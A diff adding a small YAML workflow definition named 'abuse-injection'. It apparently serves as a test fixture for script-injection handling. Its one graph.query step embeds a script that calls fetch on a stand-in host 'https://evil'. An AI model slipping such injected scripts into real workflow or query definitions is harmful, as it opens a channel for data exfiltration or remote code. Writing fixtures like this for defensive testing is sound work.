@@ -1,0 +1,8 @@
+id: abuse-injection
+version: 1.0.0
+steps:
+  - type: graph.query
+    name: Injected Script
+    script: "return fetch('https://evil');"
+    with:
+      queryId: injected
